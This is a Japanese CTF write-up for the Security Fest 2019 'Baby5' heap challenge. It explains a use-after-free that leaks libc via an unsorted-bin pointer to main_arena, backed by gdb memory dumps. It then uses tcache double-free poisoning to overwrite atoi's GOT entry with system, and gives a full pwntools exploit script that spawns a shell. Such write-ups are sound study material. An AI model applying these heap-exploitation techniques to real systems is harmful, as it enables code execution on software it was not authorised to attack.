---
tags: pwn
---

# Security Fest 2019 - Baby5 (Unsorted Bin)

[Security Fest 2019 - Baby5](/@Xornet/ryyrIQmTL)のUnsorted Bin経由のlibc leakを用いた別解になります。Unsorted Binを利用したlibc leakについての解説は結構丁寧に書きましたが、問題概要やtcache poisoning部分については前述の記事と全く同じなので省略します(先にそっちを見てください)。

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## Writeup

### outline

UAFがあるので一度freeされたチャンクの中身を見ることが出来る。ここでサイズがそこそこデカいチャンクはtcacheやfastbinでは無く一度Unsorted Binへ放り込まれ、その`fd`が`main_arena.top`に相当するアドレスを指すようになる。
main_arenaは`malloc_state`構造体なので構造体中で`top`メンバが存在する位置がわかればmain_arenaの配置アドレスがわかる
main_arenaはlibc中に配置されるのでlibc中でmain_arenaが存在する位置がわかればlibc leakができる。あとはtcache poisoningでGOT Overwriteして終わり

### main_arenaの配置場所

main_arenaはlibc中に配置される。また、そのオフセットはlibc毎に固定であるのでもしmain_arenaの配置箇所が判明するとlibcの配置箇所も判明することになる。
実際にgdbでmain_arenaの場所がどこかを見てみる。

```
gdb-peda$ p &main_arena
$1 = (struct malloc_state *) 0x7fffff3ebc40 <main_arena>
```

この例ではどうやら`0x7fffff3ebc40`にあるらしい。ではここでメモリ配置も見てみる。

```
gdb-peda$ info proc map
process 9442
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /mnt/c/share/CTF/nday1pwn/security_fest_2019_-_baby_5/baby5
            0x401000           0x402000     0x1000     0x1000 /mnt/c/share/CTF/nday1pwn/security_fest_2019_-_baby_5/baby5
            0x601000           0x602000     0x1000     0x1000 /mnt/c/share/CTF/nday1pwn/security_fest_2019_-_baby_5/baby5
            0x602000           0x603000     0x1000     0x2000 /mnt/c/share/CTF/nday1pwn/security_fest_2019_-_baby_5/baby5
            0x603000           0x605000     0x2000        0x0 
      0x7fffff000000     0x7fffff1e7000   0x1e7000        0x0 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7fffff1e7000     0x7fffff1f0000     0x9000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7fffff1f0000     0x7fffff3e7000   0x1f7000      0x1f0 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7fffff3e7000     0x7fffff3eb000     0x4000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7fffff3eb000     0x7fffff3ed000     0x2000   0x1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7fffff3ed000     0x7fffff3f1000     0x4000        0x0 
      0x7fffff400000     0x7fffff403000     0x3000        0x0 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7fffff403000     0x7fffff404000     0x1000     0x3000 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7fffff404000     0x7fffff405000     0x1000     0x4000 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7fffff405000     0x7fffff406000     0x1000     0x5000 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7fffff406000     0x7fffff407000     0x1000     0x6000 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7fffff407000     0x7fffff415000     0xe000     0x7000 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7fffff415000     0x7fffff416000     0x1000    0x15000 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7fffff416000     0x7fffff417000     0x1000    0x16000 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7fffff417000     0x7fffff426000     0xf000    0x17000 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7fffff426000     0x7fffff427000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7fffff627000     0x7fffff628000     0x1000    0x27000 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7fffff628000     0x7fffff629000     0x1000    0x28000 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7fffff629000     0x7fffff62a000     0x1000        0x0 
      0x7fffff7d0000     0x7fffff7d2000     0x2000        0x0 
      0x7fffff7ef000     0x7ffffffef000   0x800000        0x0 [stack]
      0x7ffffffef000     0x7fffffff0000     0x1000        0x0 [vdso]
```

これを見るとlibcはどうやら`0x7fffff000000`に配置されているらしい。ということはmain_arenaのlibc中のオフセットは`0x3ebc40`になる。
では続いてmalloc_state構造体でtopメンバがどの位置にあるかを調べる。gdbで`p main_arena`とすると中身が整理されて見れるので覗いてみる。mallocが呼ばれないとtopは0のままなので一旦mallocを呼ぶところまでプログラムを進めたとする。

```
gdb-peda$ p main_arena
$2 = {
  mutex = 0x0, 
  flags = 0x0, 
  have_fastchunks = 0x0, 
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x8402280, 
  last_remainder = 0x0, 
  bins = { (snip...) }
  binmap = {0x0, 0x0, 0x0, 0x0}, 
  next = 0x7fffff3ebc40 <main_arena>, 
  next_free = 0x0, 
  attached_threads = 0x1, 
  system_mem = 0x21000, 
  max_system_mem = 0x21000
}
```

ではmain_arena付近のメモリを覗いてみる

```
$ x/16xg &main_arena
0x7fffff3ebc40 <main_arena>:    0x0000000000000000      0x0000000000000000
0x7fffff3ebc50 <main_arena+16>: 0x0000000000000000      0x0000000000000000
0x7fffff3ebc60 <main_arena+32>: 0x0000000000000000      0x0000000000000000
0x7fffff3ebc70 <main_arena+48>: 0x0000000000000000      0x0000000000000000
0x7fffff3ebc80 <main_arena+64>: 0x0000000000000000      0x0000000000000000
0x7fffff3ebc90 <main_arena+80>: 0x0000000000000000      0x0000000000000000
0x7fffff3ebca0 <main_arena+96>: 0x0000000008402280      0x0000000000000000
0x7fffff3ebcb0 <main_arena+112>:        0x00007fffff3ebca0      0x00007fffff3ebca0
```

`<main_arena+96>`、つまりmain_arenaの位置から0x60だけ離れたところにtopメンバの値が入っていることがわかる。

### UAFからUnsorted Binを利用したlibc leak

さて、Unsorted Binに入ったチャンクのfdは`main_arena.top`を指す。ということはfreeした後にこのチャンクを覗く(show)ことが出来れば先程の検証で判明した値(オフセット)を利用してlibcの配置場所を特定することが出来る。
先程の検証で`&main_arena.top = &libc + 0x3ebc40 + 0x60`ということが分かった。というわけで判明した値からこの2つの値を引けばlibcの配置アドレスが判明する。

### tcache poisoning

libcが無事に判明したので後はいつもどおりtcache poisoningをするだけである。今回はDouble Freeして`atoi`のGOTを`system`のアドレスに書き換えて選択肢に`"/bin/sh"`を送り込んでシェルを起動した。

## Code

```python
from pwn import process, p64, u64, ELF


def _select(s, sel, c=b"> "):
    s.recvuntil(c)
    s.sendline(sel)


def add(s, size, data=b"junk"):
    _select(s, b"1")
    print("[+] add")
    s.recvuntil("size: ")
    s.sendline(str(size).encode())
    s.recvuntil("data: ")
    s.sendline(data)


def edit(s, idx, size, data):
    _select(s, b"2")
    print("[+] edit")
    s.recvuntil("item: ")
    s.sendline(str(idx).encode())
    s.recvuntil("size: ")
    s.sendline(str(size).encode())
    s.recvuntil("data: ")
    s.sendline(data)


def delete(s, idx):
    _select(s, b"3")
    print("[+] delete")
    s.recvuntil("item: ")
    s.sendline(str(idx).encode())


def show(s, idx):
    _select(s, b"4")
    print("[+] show")
    s.recvuntil("item: ")
    s.sendline(str(idx).encode())
    s.recvuntil("data: ")
    return s.recvline().rstrip()


if __name__ == '__main__':
    elf = ELF("./baby5")
    libc = ELF("./libc.so.6")  # 2.27

    atoi_got = elf.got["atoi"]
    ptr_list = 0x6020c0

    atoi_libc = libc.symbols["atoi"]
    system_libc = libc.symbols["system"]
    arena_top_libc = 0x3ebc40 + 0x60

    s = process("./baby5")

    add(s, 0x500) # idx = 0 -> to Unsorted bin
    add(s, 0x20)  # idx = 1 -> to tcache
    delete(s, 0)
    libc_base = u64(show(s, 0).ljust(8, b"\x00")) - arena_top_libc
    print(hex(libc_base))
    system_addr = libc_base + system_libc

    # tcache poisoning
    delete(s, 1)
    delete(s, 1)
    add(s, 0x20, p64(atoi_got))
    add(s, 0x20)
    add(s, 0x20, p64(system_addr))
    _select(s, b"/bin/sh")

    """
    --- https://hackmd.io/@Xornet/ryyrIQmTL ---

    idx = 0
    add(s, 0x20)
    delete(s, idx)
    edit(s, 0, 0x20, p64(ptr_list))
    add(s, 0x20)
    add(s, 0x20, p64(atoi_got))
    libcbase = u64(show(s, 0).ljust(8, b"\x00")) - atoi_libc
    print(hex(libcbase))

    system_addr = libcbase + system_libc
    edit(s, 0, 0x20, p64(system_addr))
    _select(s, b"/bin/sh")
    """

    s.interactive()

```

## Flag

ローカルでシェル取っただけなのでないです

## 参考Writeup

* [ptr-yudaiさんのwriteup](https://bitbucket.org/ptr-yudai/writeups/src/master/2019/Security_Fest_2019/Baby5/)
* [Jsecさんのwriteup](https://blog.naver.com/yjw_sz/221545467240)